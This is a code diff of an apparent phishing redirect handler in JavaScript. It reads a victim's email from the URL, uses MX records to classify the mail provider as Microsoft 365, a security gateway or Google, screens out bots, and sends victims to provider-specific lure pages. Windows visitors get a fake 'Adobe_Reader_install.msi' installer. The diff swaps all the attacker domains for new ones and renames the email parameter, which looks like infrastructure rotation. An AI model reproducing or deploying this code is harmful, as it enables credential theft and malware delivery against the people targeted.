@@ -3,13 +3,13 @@ import dns from "dns/promises";
 /* ================= CONFIG ================= */
 
 const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
-  "https://marcenarias.net/adobe/reader/download.html";
+  "https://aspiceconference.com/adobe-reader/installer/download.html";
 
 const MSI_PATH = "/Adobe_Reader_install.msi";
 
-const OFFICE_TARGET = "https://marcenarias.net/off";
-const GOOGLE_TARGET = "https://marcenarias.net/cw";
-const DEFAULT_TARGET = "https://marcenarias.net/cw";
+const OFFICE_TARGET = "https://aspiceconference.com/cw";
+const GOOGLE_TARGET = "https://aspiceconference.com/wa";
+const DEFAULT_TARGET = "https://aspiceconference.com/wa";
 
 const MX_TIMEOUT_MS = 1500;
 
@@ -24,56 +24,35 @@ function isBot(ua = "") {
 }
 
 function extractEmail(req) {
-  let email = "";
-
-  if (req.query?.email)
-    email = Array.isArray(req.query.email)
-      ? req.query.email[0]
-      : req.query.email;
-  else if (req.query?.smn)
-    email = Array.isArray(req.query.smn)
-      ? req.query.smn[0]
-      : req.query.smn;
-
-  return typeof email === "string" ? email.trim().toLowerCase() : "";
+  if (!req.query?.ext) return "";
+  return Array.isArray(req.query.ext)
+    ? req.query.ext[0].toLowerCase().trim()
+    : req.query.ext.toLowerCase().trim();
 }
 
-/**
- * IMPORTANT:
- * - Office-likely MUST outrank Google
- * - Google detection MUST be strict
- */
 function classifyMx(exchanges) {
-  const joined = exchanges.join(" ");
+  const mx = exchanges.join(" ");
 
-  /* 1️⃣ Office DEFINITE */
-  if (joined.includes("mail.protection.outlook.com"))
-    return "office_definite";
+  // Microsoft 365
+  if (mx.includes("mail.protection.outlook.com"))
+    return "office";
 
-  /* 2️⃣ Office LIKELY (enterprise gateways) */
+  // Office-backed security gateways
   if (
-    joined.includes("pphosted.com") ||
-    joined.includes("mimecast.com") ||
-    joined.includes("barracudanetworks.com") ||
-    joined.includes("arsmtp.com") ||
-    joined.includes("iphmx.com") ||
-    joined.includes("messagelabs.com") ||
-    joined.includes("forcepoint.com") ||
-    joined.includes("sophos.com")
+    mx.includes("pphosted.com") ||           // Proofpoint
+    mx.includes("mimecast.com") ||
+    mx.includes("barracudanetworks.com") ||
+    mx.includes("arsmtp.com") ||
+    mx.includes("iphmx.com") ||
+    mx.includes("messagelabs.com") ||
+    mx.includes("forcepoint.com") ||
+    mx.includes("sophos.com")
   )
-    return "office_likely";
+    return "office";
 
-  /* 3️⃣ Google DEFINITE (STRICT only) */
-  if (
-    exchanges.some(mx =>
-      mx === "aspmx.l.google.com" ||
-      mx.startsWith("alt1.aspmx.l.google.com") ||
-      mx.startsWith("alt2.aspmx.l.google.com") ||
-      mx.startsWith("alt3.aspmx.l.google.com") ||
-      mx.startsWith("alt4.aspmx.l.google.com")
-    )
-  )
-    return "google_definite";
+  // Google Workspace
+  if (mx.includes("google.com"))
+    return "google";
 
   return "other";
 }
@@ -88,7 +67,7 @@ async function resolveMxWithTimeout(domain) {
 }
 
 async function detectProvider(email) {
-  if (!email || !email.includes("@")) return "other";
+  if (!email.includes("@")) return "other";
 
   const domain = email.split("@")[1];
 
@@ -102,7 +81,8 @@ async function detectProvider(email) {
     mxCache.set(domain, provider);
     return provider;
   } catch {
-    return "other"; // fail-open
+    // ✅ FAIL BACK TO DEFAULT (unchanged behavior)
+    return "other";
   }
 }
 
@@ -162,8 +142,8 @@ export default async function handler(req, res) {
   if (email) {
     const provider = await detectProvider(email);
 
-    if (provider.startsWith("office")) target = OFFICE_TARGET;
-    else if (provider === "google_definite") target = GOOGLE_TARGET;
+    if (provider === "office") target = OFFICE_TARGET;
+    else if (provider === "google") target = GOOGLE_TARGET;
   }
 
   const finalUrl = email
@@ -173,7 +153,3 @@ export default async function handler(req, res) {
   res.writeHead(302, { Location: finalUrl });
   res.end();
 }
-
-
-
-
